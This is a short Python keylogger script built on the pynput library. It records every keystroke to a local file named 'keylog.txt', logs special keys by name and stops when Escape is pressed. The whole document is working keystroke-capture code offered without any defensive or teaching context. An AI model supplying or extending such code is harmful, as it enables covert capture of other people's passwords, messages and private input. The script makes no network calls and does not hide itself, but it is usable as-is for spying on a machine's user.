from pynput.keyboard import Key, Listener

# Log file where keystrokes will be saved
log_file = "keylog.txt"

# Function to log each key press
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        # Handle special keys (e.g., space, shift, etc.)
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            else:
                f.write(f'[{key}]')

# Function to stop keylogger (when escape key is pressed)
def on_release(key):
    if key == Key.esc:
        return False

# Start listening to keystrokes
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
